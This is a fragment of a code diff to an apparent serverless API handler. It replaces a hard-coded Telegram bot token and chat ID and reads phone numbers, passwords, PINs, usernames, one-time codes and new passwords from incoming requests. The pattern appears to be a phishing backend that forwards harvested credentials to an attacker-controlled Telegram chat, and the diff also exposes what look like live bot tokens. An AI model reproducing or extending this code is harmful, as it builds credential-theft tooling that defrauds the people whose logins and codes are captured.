@@ -16,8 +16,8 @@ export default async function handler(req, res) {
         return res.status(405).json({ error: 'Method Not Allowed' });
     }
 
-    const TELEGRAM_BOT_TOKEN = '9071420562:AAH1f5Jj7CmPl0hRZrHdOY_KWwS8ZNBvtDs';
-    const TELEGRAM_CHAT_ID = '7171384496';
+    const TELEGRAM_BOT_TOKEN = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
+    const TELEGRAM_CHAT_ID = '6076330929';
 
     const { type, phone, password, pin, username, otp, newPassword, details } = req.body;
 
